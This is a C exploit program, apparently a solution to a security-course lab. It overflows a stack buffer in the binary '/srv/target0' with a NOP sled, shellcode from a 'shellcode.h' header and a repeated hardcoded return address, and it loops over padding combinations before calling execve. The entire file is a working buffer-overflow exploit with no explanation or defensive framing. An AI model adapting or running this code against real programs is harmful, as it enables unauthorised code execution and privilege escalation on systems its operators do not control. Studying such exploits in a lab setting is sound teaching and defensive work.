#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"
#define BUFFER_SIZE 408

int main(void) {
    char *args[3];
    char *env[1] = {NULL};
    const char* RETURN_ADDRESS = "\x30\xd3\xff\xff";  // 0xffffd330
    int shellcode_length = strlen(shellcode);  // Assume shellcode is null-terminated
    int max_length = BUFFER_SIZE - shellcode_length - 1;  // Subtract 1 for the null terminator

    char buf[BUFFER_SIZE];

    for (int nop_count = 0; nop_count * 4 <= max_length; nop_count++) {
        for (int ret_count = 0; (nop_count * 1 + ret_count * 4) <= max_length; ret_count++) {
            if ((nop_count * 1 + ret_count * 4) == max_length) {
                memset(buf, 0, sizeof(buf));
                memset(buf, '\x90', nop_count);
                strcat(buf, shellcode);
                for (int i = 0; i < ret_count; i++) {
                    strcat(buf, RETURN_ADDRESS);
                }

                args[0] = TARGET;
                args[1] = buf;
                args[2] = NULL;

                printf("Testing with NOP_COUNT = %d, RETURN_ADDRESS_COUNT = %d\n", nop_count, ret_count);
                execve(TARGET, args, env);
                fprintf(stderr, "execve failed.\n");
            }
        }
    }

    return 0;
}
